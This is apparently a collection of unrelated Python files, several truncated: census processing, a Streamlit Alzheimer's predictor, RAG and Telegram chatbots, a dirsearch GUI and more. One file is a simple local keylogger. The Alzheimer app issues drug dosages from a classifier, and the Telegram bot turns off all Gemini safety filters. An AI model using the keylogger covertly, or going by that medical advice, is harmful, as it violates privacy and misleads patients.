X.drop(columns=['CBO-Domiciliar'])\n    \n    # removendo que tem gradua\u00e7\u00e3o, mas o curso superior \u00e9 igual  a Zero\n    X.drop(X[(X['N\u00edvel_instru\u00e7\u00e3o'] ==4) & (X['Curso_Superior_Gradua\u00e7\u00e3o_C\u00f3digo'] ==0)].index, inplace=True) ## alterado 23/09/2023 #=============================\n   \n\n    name_path = name.split(\".csv\")\n    path_proc = ['/home/essantos/Downloads/ibge-2010/processados/Sul/Graduados_NaoGraduados/', '/home/essantos/Downloads/ibge-2010/processados/Centro_Oeste/Graduados_NaoGraduados/']\n    name_path = path_proc[i] + name_path[0] + \"_Graduados_NaoGraduados.csv\"\n    X.to_csv(name_path) \n    return   \n\n#https://colab.research.google.com/drive/16TrgyaIq6T0fbGKl9gOWBXxbAIUfJtCD?authuser=1#scrollTo=qXidkc7VxkIT\n#https://colab.research.google.com/drive/1byICdSAZxE2L8mS5NYpVjMcxKSqvlPUo?authuser=1#scrollTo=SQYQRsulgWpt\ndef Pivot_Table_Censo(path,name,gender,i):\n    #...\n    if gender == \"M\":\n        \n        file = path + name\n        X= pd.read_csv(file,usecols=[\"N\u00edvel_instru\u00e7\u00e3o\", \"Ocupa\u00e7\u00e3o_C\u00f3digo\", \"g\u00eanero\"], sep=\",\")  \t\n\n        #Novo Filtro\n        #removendo pessoas do sexo feminino ...\n        X.drop(X[(X['g\u00eanero'] ==2)].index, inplace=True)\n        \n        X_1 = Pivot_Table(X)\n\n        name_path = name.split(\".csv\")\n        path_proc = ['/home/essantos/Downloads/ibge-2010/processados/Sul/PivotTablet/', '/home/essantos/Downloads/ibge-2010/processados/Centro_Oeste/PivotTablet/']\n        name_path = path_proc[i] + name_path[0] + \"_PivotTabletMasculina.csv\"\n        X_1.to_csv(name_path)\n    else:\n        if gender == \"F\":\n           \n           file = path + name\n           X= pd.read_csv(file,usecols=[\"N\u00edvel_instru\u00e7\u00e3o\", \"Ocupa\u00e7\u00e3o_C\u00f3digo\", \"g\u00eanero\"], sep=\",\")  \t\n\n           #Novo Filtro\n           #removendo pessoas do sexo masculino ...\n           X.drop(X[(X['g\u00eanero'] ==1)].index, inplace=True)\n\n           X_1 = Pivot_Table(X)\n\n           name_path = name.split(\".csv\")\n           path_proc = ['/home/essantos/Downloads/ibge-2010/processados/Sul/PivotTablet/', '/home/essantos/Downloads/ibge-2010/processados/Centro_Oeste/PivotTablet/']\n           name_path = path_proc[i] + name_path[0] + \"_PivotTabletFeminina.csv\"\n           X_1.to_csv(name_path)\n        else:\n             X= pd.read_csv(name,usecols=[\"N\u00edvel_instru\u00e7\u00e3o\", \"Ocupa\u00e7\u00e3o_C\u00f3digo\", \"g\u00eanero\"], sep=\",\")  \t\n\n             #Novo Filtro\n             #removendo pessoas do sexo masculino ...\n            ",
    "\"\"\"This modules contains data about prediction page\"\"\"\n\n# Import necessary modules\nimport streamlit as st\n\n# Import necessary functions from web_functions\nfrom web_functions import predict\n\n\ndef app(df, X, y):\n    \"\"\"This function create the prediction page\"\"\"\n\n    # Add title to the page\n    st.title(\"Prediction Page\")\n\n    # Add a brief description\n    st.markdown(\n        \"\"\"\n            <p style=\"font-size:25px\">\n                This app uses <b style=\"color:green\">Random Forest Classifier</b> for the Alzheimer's Stage Detection depending on Biomarkers and Verbal Test\n            </p>\n        \"\"\", unsafe_allow_html=True)\n\n    \n    # Take feature input from the user\n    # Add a subheader\n    st.subheader(\"Select Values:\")\n\n    # Take input of features from the user.\n    A = st.slider(\"Response\", int(df[\"Response\"].min()), int(df[\"Response\"].max()))\n    B = st.slider(\"Gender\", int(df[\"Gender\"].min()), int(df[\"Gender\"].max()))\n    C= st.slider(\"Age\", int(df[\"Age\"].min()), int(df[\"Age\"].max()))\n    D = st.slider(\"Peripheral Nervous System Activity Scale\", int(df[\"PNSA\"].min()), int(df[\"PNSA\"].max()))\n    E = st.slider(\"SES\", int(df[\"SES\"].min()), int(df[\"SES\"].max()))\n    F = st.slider(\"MMSE\", int(df[\"MMSE\"].min()), int(df[\"MMSE\"].max()))\n    G = st.slider(\"CDR\", int(df[\"CDR\"].min()), int(df[\"CDR\"].max()))\n    H = st.slider(\"eTIV\", int(df[\"eTIV\"].min()), int(df[\"eTIV\"].max()))\n    I = st.slider(\"nWBV\", float(df[\"nWBV\"].min()), float(df[\"nWBV\"].max()))\n    J = st.slider(\"ASF\",int(df[\"ASF\"].min()), int(df[\"ASF\"].max()))\n    K = st.slider(\"Group\",int(df[\"Group\"].min()), int(df[\"Group\"].max()))\n    \n    k = 6.5\n    # Create a list to store all the features\n    features = [A,B,C,D,E,F,G,H,I,J,K]\n\n    # Create a button to predict\n    if st.button(\"Predict\"):\n        # Get prediction and model score\n        prediction, score = predict(X, y, features)\n        score = score\n        st.info(\"Predicted Sucessfully...\")\n\n        # Print the output according to the prediction\n        if (prediction == 1):\n            st.warning(\"The person is prone to regular forgetfulness\")\n            st.subheader('Clinical Directions')\n            st.markdown('''Remember to take almonds (70 - 100)g in the morning, soaked in water overnight. According to many physicians and Ayurveda this is proven to improve memory. You may also consult a dietacian and take special herbs like Asparagus for better memory. No other medical intervention is prescribed at this stage.''')\n        elif (prediction == 2):\n            st.warning(\"The person is prone to mild Alzhiemer\")\n            st.subheader('Clinical Directions')\n            st.markdown('''For mild Alzheimer's disease, it's essential to follow a comprehensive treatment plan involving medication, lifestyle modifications, and support. Here are some remedial guidelines:\n\n1. Medication:\n   - **Donepezil**: A cholinesterase inhibitor that helps improve cognitive function. Initial dosage is 5 mg once daily, typically increased to 10 mg once daily after 4-6 weeks.\n   - **Memantine**: An NMDA receptor antagonist that helps regulate glutamate activity in the brain. Start with 5 mg once daily, then increase to 10 mg twice daily after one week.\n\n2. Lifestyle modifications:\n   - Encourage regular physical exercise, which can improve cognitive function and overall well-being.\n   - Promote a balanced diet rich in fruits, vegetables, whole grains, and healthy fats, such as those found in fish.\n   - Ensure adequate social engagement and mental stimulation through activities like puzzles, games, and socializing.\n   - Establish a consistent daily routine to minimize confusion and anxiety.\n\n3. Support:\n   - Provide support and understanding to the individual and their caregivers.\n   - Encourage participation in support groups or therapy to address emotional challenges and provide coping strategies.\n\nIt's crucial to regularly monitor the individual's response to medication and adjust treatment as necessary. Additionally, consult with a healthcare professional for personalized guidance and to address any concerns or changes in symptoms.''')\n        elif (prediction == 3):\n            st.warning(\"The person is prone to clinical Alzhiemer\")\n            st.subheader('Clinical Directions')\n            st.markdown('''For individuals diagnosed with mild to moderate Alzheimer's disease, a combination of medication and non-pharmacological interventions can help manage symptoms and slow down progression. Medications commonly prescribed for Alzheimer's include:\n\n1. Donepezil (brand name: Aricept): A cholinesterase inhibitor that helps improve cognitive function and may slow the progression of symptoms. The typical dosage is 5-10 mg per day, taken orally.\n\n2. Memantine (brand name: Namenda): An NMDA receptor antagonist that regulates glutamate activity in the brain, helping to improve memory, attention, and reasoning. The usual dosage is 10 mg twice daily, orally.\n\n3. Rivastigmine (brand name: Exelon): Another cholinester",
    "import os\nimport json\nimport logging\nimport pathlib\nimport requests\nimport numpy as np\nimport pandas as pd\nimport networkx as nx\nimport streamlit as st\nfrom pyvis.network import Network\nfrom sklearn.cluster import KMeans\nfrom langchain_community.llms import Ollama\nfrom sklearn.mixture import GaussianMixture\nimport streamlit.components.v1 as components\nfrom langchain.prompts import ChatPromptTemplate\nfrom langchain_community.vectorstores import Chroma\nfrom langchain.memory import ConversationBufferMemory\nfrom sklearn.metrics.pairwise import cosine_similarity\nfrom langchain.chains import ConversationalRetrievalChain\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_experimental.text_splitter import SemanticChunker\nfrom langchain_community.embeddings import HuggingFaceInstructEmbeddings\nfrom langchain_community.document_loaders import (\n    CSVLoader,\n    PyMuPDFLoader,\n    TextLoader,\n    UnstructuredPowerPointLoader,\n    Docx2txtLoader,\n    UnstructuredExcelLoader,\n)\n\n\nFILE_LOADERS = {\n    \"csv\": CSVLoader,\n    \"docx\": Docx2txtLoader,\n    \"pdf\": PyMuPDFLoader,\n    \"pptx\": UnstructuredPowerPointLoader,\n    \"txt\": TextLoader,\n    \"xlsx\": UnstructuredExcelLoader,\n}\n\nACCEPTED_FILE_TYPES = list(FILE_LOADERS)\n\nlogger = logging.getLogger(__name__)\n\n# Message classes\nclass Message:\n    def __init__(self, content):\n        self.content = content\n\nclass HumanMessage(Message):\n    \"\"\"Represents a message from the user.\"\"\"\n    pass\n\nclass AIMessage(Message):\n    \"\"\"Represents a message from the AI.\"\"\"\n    pass\n\n@st.cache_resource\ndef load_model():\n    with st.spinner(\"Downloading Instructor XL Embeddings Model locally....please be patient\"):\n        embedding_model=HuggingFaceInstructEmbeddings(model_name=\"hkunlp/instructor-large\", model_kwargs={\"device\": \"cuda\"})\n    return embedding_model\n\n# Class for chatting with pcap data\nclass ChatWithDocuments:\n    def __init__(self, file_path, file_type):\n        self.embedding_model = load_model()\n        self.file_path = file_path\n        self.file_type = file_type\n        self.load_document()\n        self.llm = Ollama(model=st.session_state['selected_model'], base_url=\"http://ollama:11434\")\n        self.document_cluster_mapping = {}\n        self.conversation_history = []\n        self.split_into_chunks()        \n        self.root_node = None\n        self.create_leaf_nodes()\n        self.build_tree()  # This will build the tree\n        self.store_in_chroma()\n        self.setup_conversation_memory()\n        self.setup_conversation_retrieval_chain()\n\n    def load_document(self):\n        self.loader = FILE_LOADERS[self.file_type](file_path=self.file_path)\n        self.pages = self.loader.load_and_split()\n\n    def split_into_chunks(self):\n        self.text_splitter = SemanticChunker(self.embedding_model)\n        self.docs = self.text_splitter.split_documents(self.pages)\n\n    def create_leaf_nodes(self):\n        self.leaf_nodes = [Node(text=doc.page_content) for doc in self.docs]\n        self.embed_leaf_nodes()\n        st.write(f\"Leaf nodes created. Total count: {len(self.leaf_nodes)}\")\n\n    def embed_leaf_nodes(self):\n        for leaf_node in self.leaf_nodes:\n            try:\n                embedding = self.embedding_model.embed_query(leaf_node.text)\n                if embedding is not None and not np.isnan(embedding).any():\n                    leaf_node.embedding = embedding\n                else:\n                    # Handle the case where embedding is nan or None\n                    st.write(f\"Invalid embedding generated for leaf node with text: {leaf_node.text}\")\n            except Exception as e:\n                st.write(f\"Error embedding leaf node: {e}\")\n\n    def determine_initial_clusters(self, nodes):\n        # This is a simple heuristic: take the square root of the number of nodes,\n        # capped at a minimum of 2 and a maximum that makes sense for your application.\n        return max(2, int(len(nodes)**0.5))\n\n    def cluster_nodes(self, nodes, n_clusters=2):\n        st.write(f\"Clustering {len(nodes)} nodes into {n_clusters} clusters...\")\n        embeddings = np.array([node.embedding for node in nodes if node.embedding is not None])\n        st.write(\"Embeddings as of Cluster Nodes:\", embeddings)\n        # Check if embeddings is empty\n        if embeddings.size == 0:\n            # Handle the case where there are no embeddings to cluster\n            # This could be logging a warning and returning the nodes as a single cluster or any other logic you see fit\n            st.write(\"Warning: No valid embeddings found for clustering. Returning nodes as a single cluster.\")\n            return [nodes]  # Return all nodes as a single cluster to avoid crashing\n\n        # Check if embeddings is not empty but a 1D array, reshape it\n        if embeddings.ndim == 1:\n            embeddings = embeddings.reshape(-1, 1)\n\n        # Proceed with KMeans clustering\n        kmeans = KMeans(n_clusters=n_clusters, random_state=0)\n        try:\n            kmeans.fit(embeddings",
    "from os import system, name\nimport sys\n\nfrom common.color import Color\nfrom models.admin import Admin\nfrom models.student import Student\nfrom controllers import admin_controller as admin_ctrl\nfrom controllers import student_controller as stu_ctrl\n\n\nclass UniApp:\n    session: Student | Admin | None\n\n    def __init__(self) -> None:\n        self.session = None\n\n    def main(self):\n        while True:\n            if type(self.session) is Admin:\n                self.admin_menu()\n            elif type(self.session) is Student:\n                self.student_menu()\n            else:\n                self.default_menu()\n\n    def default_menu(self):\n        while True:\n            Color.prCyan(\"1. [L]ogin [S]tudent\")\n            Color.prCyan(\"2. [L]ogin [A]dmin\")\n            Color.prCyan(\"3. [R]egister\")\n            Color.prCyan(\"4. [C]lear\")\n            Color.prCyan(\"5. [E]xit\")\n            Color.prCyan(\"==========================\")\n\n            userchoice = input(\"User can choose either [Number] or the [First Letter]: \")\n\n            match userchoice.lower():\n                case \"1\" | \"ls\":\n                    self.session = stu_ctrl.StudentController().login()\n                    break\n                case \"1\" | \"la\":\n                    self.session = Admin()\n                    break\n                case \"3\" | \"r\":\n                    stu_ctrl.StudentController().register()\n                    break\n                case \"4\" | \"c\":\n                    self.clear()\n                case \"5\" | \"e\":\n                    Color.prYellow(\"Exit\")\n                    self.exit()\n                    break\n\n    def admin_menu(self):\n        while True:\n            Color.prCyan(\"1. [V]iew All Students\")\n            Color.prCyan(\"2. [G]roup Students\")\n            Color.prCyan(\"3. [P]artition Students\")\n            Color.prCyan(\"4. [R]emove Student\")\n            Color.prCyan(\"5. [C]lear [D]ata\")\n            Color.prCyan(\"6. [C]lear\")\n            Color.prCyan(\"7. [L]ogout\")\n            Color.prCyan(\"8. [Q]uit\")\n            Color.prCyan(\"==========================\")\n\n            userchoice = input(\"User can choose either [Number] or the [First Letter]: \")\n\n            match userchoice.lower():\n                case \"1\" | \"v\":\n                    admin_ctrl.AdminController().view_students()\n                case \"2\" | \"g\":\n                    pass\n                case \"3\" | \"p\":\n                    pass\n                case \"4\" | \"r\":\n                    pass\n                case \"5\" | \"cd\":\n                    admin_ctrl.AdminController().clear_database()\n                case \"6\" | \"c\":\n                    self.clear()\n                case \"7\" | \"l\":\n                    self.__logout()\n                    break\n                case \"8\" | \"q\":\n                    Color.prYellow(\"Exit\")\n                    self.exit()\n                    break\n\n    def student_menu(self):\n        while True:\n\n            if type(self.session) is not Student:\n                break\n\n            Color.prCyan(\"1. [E]nrol New Subject\")\n            Color.prCyan(\"2. [R]emove Subject\")\n            Color.prCyan(\"3. [V]iew My Enrolment\")\n            Color.prCyan(\"4. [S]ubject Result\")\n            Color.prCyan(\"5. [Se]ssion Result\")\n            Color.prCyan(\"6. [C]hange [P]assword\")\n            Color.prCyan(\"7. [C]lear\")\n            Color.prCyan(\"8. [L]ogout\")\n            Color.prCyan(\"9. [Q]uit\")            \n            Color.prCyan(\"==========================\")\n\n            if self.session:\n                Color.prYellow(f\"Hello \\n{self.session.__str__()}\")\n\n            userchoice = input(\"User can choose either [Number] or the [First Letter]: \")\n\n            match userchoice.lower():\n                case \"1\" | \"e\":\n                    stu_ctrl.StudentController().enrol_subject(self.session)\n                case \"2\" | \"r\":\n                    stu_ctrl.StudentController().remove_subject(self.session)\n                case \"3\" | \"v\":\n                    stu_ctrl.StudentController().view_enrolment(self.session)\n                case \"4\" | \"s\":\n                    pass\n                case \"5\" | \"se\":\n                    pass\n                case \"6\" | \"cp\":\n                    pass\n                case \"7\" | \"c\":\n                    self.clear()\n                case \"8\" | \"l\":\n                    self.__logout()\n                    break\n                case \"9\" | \"q\":\n                    Color.prYellow(\"Exit\")\n                    self.exit()\n                    break\n\n\n    def __logout(self):\n        self.session = None\n\n    @staticmethod\n    def clear():\n        # for windows\n        if name == 'nt':\n            _ = system('cls')\n        # for mac and linux(here, os.name is 'posix')\n        else:\n            _ = system('clear')\n\n    @staticmethod\n    def exit():\n        sys.exit()\n\nif __name__ == \"__main__\":\n    UniApp().main()\n",
    "import tkinter as tk\r\nfrom tkinter import *\r\nfrom pynput import keyboard\r\nimport json\r\n\r\n# Global variables\r\nkeys_used = []\r\nflag = False\r\noutput_file = 'selvaharini key_log.json'\r\n\r\n# Function to generate log files\r\ndef generate_log(data, file_path):\r\n    with open(file_path, 'w') as file:\r\n        json.dump(data, file)\r\n\r\n# Function called when a key is pressed\r\ndef on_press(key):\r\n    global flag, keys_used\r\n    if flag == False:\r\n        keys_used.append({'Pressed': str(key)})\r\n        flag = True\r\n    else:\r\n        keys_used.append({'Held': str(key)})\r\n    generate_log(keys_used, output_file)\r\n\r\n# Function called when a key is released\r\ndef on_release(key):\r\n    global flag, keys_used\r\n    keys_used.append({'Released': str(key)})\r\n    if flag == True:\r\n        flag = False\r\n    generate_log(keys_used, output_file)\r\n\r\n# Function to start the keylogger\r\ndef start_keylogger():\r\n    global listener\r\n    listener = keyboard.Listener(on_press=on_press, on_release=on_release)\r\n    listener.start()\r\n    label.config(text=\"[+] Keylogger is running!\\n[!] Saving the keys in 'keylogger.json'\")\r\n    start_button.config(state='disabled')\r\n    stop_button.config(state='normal')\r\n\r\n# Function to stop the keylogger\r\ndef stop_keylogger():\r\n    global listener\r\n    listener.stop()\r\n    label.config(text=\"Keylogger stopped.\")\r\n    start_button.config(state='normal')\r\n    stop_button.config(state='disabled')\r\n\r\n# GUI setup\r\nroot = Tk()\r\nroot.title(\"Keylogger\")\r\n\r\nlabel = Label(root, text='Click \"Start\" to begin keylogging.')\r\nlabel.config(anchor=CENTER)\r\nlabel.pack()\r\n\r\nstart_button = Button(root, text=\"Start\", command=start_keylogger)\r\nstart_button.pack(side=LEFT)\r\n\r\nstop_button = Button(root, text=\"Stop\", command=stop_keylogger, state='disabled')\r\nstop_button.pack(side=RIGHT)\r\n\r\nroot.geometry(\"250x150\")\r\nroot.mainloop()\r\n",
    "'''\n20. Valid Parentheses\nSolved\nEasy\nTopics\nCompanies\nHint\nGiven a string s containing just the characters '(', ')', '{', '}', '[' and ']', determine if the input string is valid.\n\nAn input string is valid if:\n\nOpen brackets must be closed by the same type of brackets.\nOpen brackets must be closed in the correct order.\nEvery close bracket has a corresponding open bracket of the same type.\n \n\nExample 1:\n\nInput: s = \"()\"\nOutput: true\nExample 2:\n\nInput: s = \"()[]{}\"\nOutput: true\nExample 3:\n\nInput: s = \"(]\"\nOutput: false\n \n\nConstraints:\n\n1 <= s.length <= 104\ns consists of parentheses only '()[]{}'.\n'''\nclass Solution:\n  def solution(self, s: str) -> bool:\n    q = []\n    lr = {\")\":\"(\", \"]\":\"[\", \"}\":\"{\"}\n    for each in s:\n      if each in \"([{\":\n        q.append(each)\n      elif each in \")]}\":\n        if len(q) == 0:\n          return False\n        if q[-1] != lr[each]:\n          return False\n        q.pop() \n    \n    if len(q) > 0:\n      return False\n    return True\n  \nif __name__ == \"__main__\":\n   app = Solution()\n   print(app.solution(\"()[]{}}\"))\n",
    "#remember:pip3 install keyboard\r\n#remember:pip3 install pycaw\r\nfrom ctypes import windll,cast,POINTER\r\n#windll.user32.ShowWindow(windll.user32.GetForegroundWindow(),0)\r\nfrom keyboard import is_pressed\r\nfrom time import sleep\r\nfrom comtypes import CLSCTX_ALL\r\nfrom pycaw.pycaw import AudioUtilities,IAudioEndpointVolume\r\nvolume=cast(AudioUtilities.GetSpeakers().Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL,None),POINTER(IAudioEndpointVolume))\r\nhide_list=[]\r\nwhile 1:\r\n    sleep(0.05)\r\n    if hide_list:\r\n        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0],None)\r\n    if is_pressed('ctrl') and is_pressed('alt') and is_pressed('z'):\r\n        window=windll.user32.GetForegroundWindow()\r\n        windll.user32.ShowWindow(window,0)\r\n        hide_list.append(window)\r\n        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0],None)\r\n        while is_pressed('ctrl') and is_pressed('alt') and is_pressed('z'):\r\n            sleep(0.05)\r\n    if is_pressed('ctrl') and is_pressed('alt') and is_pressed('s'):\r\n        for i in hide_list:\r\n            windll.user32.ShowWindow(i,1)\r\n        hide_list=[]\r\n        while is_pressed('ctrl') and is_pressed('alt') and is_pressed('s'):\r\n            sleep(0.05)\r\n    if is_pressed('ctrl') and is_pressed('alt') and is_pressed('q'):\r\n        break\r\n",
    "from llama_index.llms.mistralai import MistralAI\nfrom llama_index.embeddings.mistralai import MistralAIEmbedding\nfrom llama_index.core.settings import Settings\nfrom llama_index.core import SimpleDirectoryReader, VectorStoreIndex\nimport gradio as gr\nfrom gradio_pdf import PDF\nimport os\n\n\n# BETTER CHANGE THIS TO LLM4ALL TO RUN LOCAL\n\napi_key = os.getenv('MISTRAL_API_KEY')\nllm = MistralAI(api_key=api_key, model=\"mistral-large-latest\")\nembed_model = MistralAIEmbedding(model_name='mistral-embed', api_key=api_key)\n\nSettings.llm = llm\nSettings.embed_model = embed_model\n\ndef qa(question: str, doc: str) -> str:\n    my_pdf = SimpleDirectoryReader(input_files=[doc]).load_data()\n    my_pdf_index = VectorStoreIndex.from_documents(my_pdf)\n    my_pdf_engine = my_pdf_index.as_query_engine()\n    response = my_pdf_engine.query(question)\n    return response\n\ndemo = gr.Interface(\n    qa,\n    [gr.Textbox(label=\"Question\"), PDF(label=\"Document\")],\n    gr.Textbox())\n\nif __name__ == \"__main__\":\n    demo.launch()\n",
    "import logging\nfrom telegram import Update,InlineKeyboardButton, InlineKeyboardMarkup\nfrom telegram.ext import Updater, MessageHandler, Filters, CallbackContext,CommandHandler,ConversationHandler,CallbackQueryHandler\n#pip install python-telegram-bot==12.8\n\nimport google.generativeai as genai\nimport threading\nfrom colorama import Fore, Style\nimport textwrap\n\nimport PIL.Image\nimport os\nfrom IPython.display import display\nfrom IPython.display import Markdown\n\n# Enable logging\nlogging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)\n\n# Set up Gemini client with your API key\napi_key = os.environ['Google_api']\ngenai.configure(api_key=api_key)\nmodel = genai.GenerativeModel('gemini-pro')\nchat = model.start_chat(history=[])\nmessages =[]  #Multi-turn conversations\n\n# Define global variable to store user's choice\nuser_setting = \"Generative_conversation\"\n\n# Telegram bot token\ntelegram_bot_token =os.environ['Telgarm_api']\n\n\ndefult_promt = \"You name is Ares. devloped by Rkgroup, be a human and talk in simple english . Respond like you're Ares who chat likes human : \"\nnew_promt =None\n\ndef to_markdown(text):\n  text = text.replace('\u2022', '  *')\n  return Markdown(textwrap.indent(text, '> ', predicate=lambda _: True))\n\n# Function to generate response using OpenAI\ndef generate_response(input_text: str) -> str:\n    colored_print(\"genrating response....\",Fore.CYAN)\n    try:\n        response = chat.send_message(input_text,safety_settings={'HARASSMENT':'block_none','DANGEROUS_CONTENT':'block_none','HATE_SPEECH':'block_none','SEXUALLY_EXPLICIT':'block_none'} )\n        colored_print(f\"promt : {input_text}\\n\\n\\nResponse: \\n{response.text}\",Fore.YELLOW)\n        return response.text if input_text else \"error\"\n    except Exception:\n        try:\n            response = model.generate_content(input_text,\n                                            )\n            colored_print(f\"promt : {input_text}\\n\\n\\nResponse: \\n{response.text}\",Fore.YELLOW)\n            return response.text if input_text else \"error\"\n        except Exception as e:\n            return f\"Sorry, I couldn't generate a response at the moment. Please try again later.\\n\\n error:{e}:::\\n\\n\\n\\n  Safety rating:  {response.prompt_feedback}\"\n\ndef Multi_turn_conversations(input_text: str,username: str) -> str:\n    colored_print(\"genrating response with(Multi_turn_conversations)....\",Fore.CYAN)\n    try:\n        messages.append({'role':'user',\n                 'parts':[input_text]})\n        print (messages)\n        response = model.generate_content(messages)\n        messages.append({'role':'model',\n                 'parts':[response.text]})\n        return response.text\n    except Exception as e:\n            return f\"Sorry, I couldn't generate a response at the moment. Please try again later.\\n\\n error:{e} \\n error type {e.__traceback__}\"\n\n\n\ndef colored_print(text, color):\n  \"\"\"\n  Prints text in a specified color using the colorama library.\n\n  Args:\n      text: The text to be printed.\n      color: The desired color for the text. Can be any of the color constants\n          provided by the colorama library (e.g., Fore.RED, Fore.GREEN, etc.).\n  \"\"\"\n  colored_text = color + text + Style.RESET_ALL\n  print(colored_text)\n\ndef is_group_message(update: Update) -> bool:\n    \"\"\"Check if the message is from a group chat.\"\"\"\n    chat_type = update.message.chat.type\n    return chat_type in [\"group\", \"supergroup\"]\n\ndef process_message(update: Update, context: CallbackContext) -> None:\n    if  is_group_message  : \n        user_message = update.message.text.lower() # Convert message to lowercase\n\n        if user_message.startswith((\"hey ares\", \"hi ares\", \"ares\",\"yo ares\")):\n            user_message =strip_greetings(user_message)\n            username = update.message.from_user.username\n\n            # Check if the message is a reply\n            if update.message.reply_to_message:\n\n                # Extract the text from the replied message\n                user_message = f\"Original message: {update.message.reply_to_message.text} : Reply to that message:{user_message}\"\n                threading.Thread(target=process_message_thread, args=(update, user_message,username)).start()\n            else:\n                threading.Thread(target=process_message_thread, args=(update, user_message,username)).start()\n\n            #give the command promt\n            if username:    \n                colored_print(f\"{username}: {user_message}\",Fore.BLUE)\n            else:\n                colored_print(f\"Someone: {user_message}\",Fore.BLUE)\n\n# Function to handle incoming messages and generate response\ndef strip_greetings(message):\n    greetings = [\"hey ares\", \"hi ares\", \"ares\", \"yo ares\"]\n\n    for greeting in greetings:\n        if message.lower().startswith(greeting):  # Case-insensitive check\n            if len(message) > len(greeting) and message.lower().replace(greeting, \"\").strip() != \"\":\n                return message[len(greeting):].strip()  # Remove greeting and any leading spa",
    "from PyQt6.QtWidgets import (\r\n    QApplication, QMainWindow, QPushButton, QVBoxLayout,\r\n    QWidget, QTextEdit, QLabel, QLineEdit, QFormLayout, QScrollArea\r\n)\r\nfrom PyQt6.QtGui import QFont, QIcon\r\nfrom PyQt6.QtCore import QSize\r\nimport sys\r\nimport subprocess\r\nimport os\r\nimport uuid\r\n\r\n\r\nclass DirsearchGUI(QMainWindow):\r\n    def __init__(self):\r\n        super().__init__()\r\n\r\n        # \u7a97\u53e3\u8bbe\u7f6e\r\n        self.setWindowTitle('Dirsearch GUI - Lxy')\r\n        self.setGeometry(800, 400, 600, 400)  # \u8c03\u6574\u7a97\u53e3\u521d\u59cb\u9ad8\u5ea6\r\n        self.setWindowIcon(QIcon('your-icon-path.png'))  # \u8bbe\u7f6e\u7a97\u53e3\u56fe\u6807\r\n\r\n        # \u8bbe\u7f6e\u5b57\u4f53\r\n        font = QFont()\r\n        font.setFamily(\"Arial\")\r\n        font.setPointSize(10)\r\n\r\n        # \u521b\u5efa\u4e2d\u592e\u5c0f\u90e8\u4ef6\u548c\u5e03\u5c40\r\n        self.centralWidget = QWidget()\r\n        self.centralWidget.setFont(font)\r\n        self.layout = QVBoxLayout()\r\n\r\n        # \u521b\u5efa\u8868\u5355\u5e03\u5c40\u4ee5\u6dfb\u52a0\u8f93\u5165\u6846\u548c\u6807\u7b7e\r\n        self.formLayout = QFormLayout()\r\n        self.urlTextEdit = QTextEdit()  # \u6539\u4e3a\u591a\u884c\u6587\u672c\u6846\r\n        self.paramsLineEdit = QLineEdit()\r\n\r\n        # \u521b\u5efa\u6309\u94ae\u548c\u6807\u7b7e\r\n        self.runButton = QPushButton('\u8fd0\u884c')\r\n        self.defaultButton = QPushButton('\u9ed8\u8ba4\u53c2\u6570')\r\n        self.helpToggleButton = QPushButton('\u663e\u793a\u5e2e\u52a9')\r\n        self.statusLabel = QLabel('\u72b6\u6001: \u51c6\u5907\u5c31\u7eea')\r\n\r\n        # \u6309\u94ae\u6837\u5f0f\r\n        buttonStyle = \"\"\"\r\n            QPushButton {\r\n                color: white;\r\n                background-color: #007BFF;\r\n                border-radius: 5px;\r\n                padding: 5px;\r\n            }\r\n            QPushButton:hover {\r\n                background-color: #0056b3;\r\n            }\r\n        \"\"\"\r\n        self.runButton.setStyleSheet(buttonStyle)\r\n        self.defaultButton.setStyleSheet(buttonStyle)\r\n        self.helpToggleButton.setStyleSheet(buttonStyle)\r\n\r\n        # \u521b\u5efa\u5e2e\u52a9\u6587\u672c\u6846\u548c\u6eda\u52a8\u533a\u57df\r\n        self.helpTextEdit = QTextEdit()\r\n        self.helpScrollArea = QScrollArea()\r\n        self.helpScrollArea.setWidget(self.helpTextEdit)\r\n        self.helpScrollArea.setWidgetResizable(True)\r\n        self.helpScrollArea.setMaximumHeight(300)  # \u8c03\u5927\u6700\u5927\u9ad8\u5ea6\u4ee5\u663e\u793a\u66f4\u591a\u5e2e\u52a9\u6587\u672c\r\n        self.helpTextEdit.setStyleSheet(\"background-color: #F0F0F0;\")\r\n\r\n        # \u8bbe\u7f6e\u5e2e\u52a9\u6587\u672c\u6846\r\n        self.set_help_text()\r\n        self.helpTextEdit.setReadOnly(True)\r\n\r\n        # \u6dfb\u52a0\u8868\u5355\u5143\u7d20\r\n        self.formLayout.addRow('URLs:', self.urlTextEdit)  # \u66f4\u6539\u4e3a\u591a\u884c\u6587\u672c\u6846\r\n        self.formLayout.addRow('\u81ea\u5b9a\u4e49\u53c2\u6570:', self.paramsLineEdit)\r\n\r\n        # \u4e3a\u6309\u94ae\u6dfb\u52a0\u4e8b\u4ef6\r\n        self.runButton.clicked.connect(self.run_dirsearch)\r\n        self.defaultButton.clicked.connect(self.set_default_params)\r\n        self.helpToggleButton.clicked.connect(self.toggle_help_visibility)\r\n\r\n        # \u4e3a\u81ea\u5b9a\u4e49\u53c2\u6570\u8f93\u5165\u6846\u6dfb\u52a0\u6587\u672c\u53d8\u5316\u4e8b\u4ef6\r\n        self.paramsLineEdit.textChanged.connect(self.update_status_on_text_change)\r\n\r\n        # \u7ec4\u5408\u5e03\u5c40\r\n        self.layout.addLayout(self.formLayout)\r\n        self.layout.addWidget(self.runButton)\r\n        self.layout.addWidget(self.defaultButton)\r\n        self.layout.addWidget(self.helpToggleButton)\r\n        self.layout.addWidget(self.statusLabel)\r\n        self.layout.addWidget(self.helpScrollArea)  # \u6dfb\u52a0\u6eda\u52a8\u533a\u57df\u5230\u5e03\u5c40\u4e2d\r\n\r\n        # \u8bbe\u7f6e\u4e2d\u592e\u5c0f\u90e8\u4ef6\u548c\u5e03\u5c40\r\n        self.centralWidget.setLayout(self.layout)\r\n        self.setCentralWidget(self.centralWidget)\r\n\r\n    def set_help_text(self):\r\n        help_text = (\r\n            \"\"\"        \u5176\u4ed6:\r\n        --version: \u663e\u793a\u7a0b\u5e8f\u7248\u672c\u53f7\r\n        -h \u6216 --help: \u663e\u793a\u5e2e\u52a9\u4fe1\u606f\r\n\r\n        \u57fa\u672c\u53c2\u6570\u8bbe\u7f6e:\r\n        -u \u6216 --url: 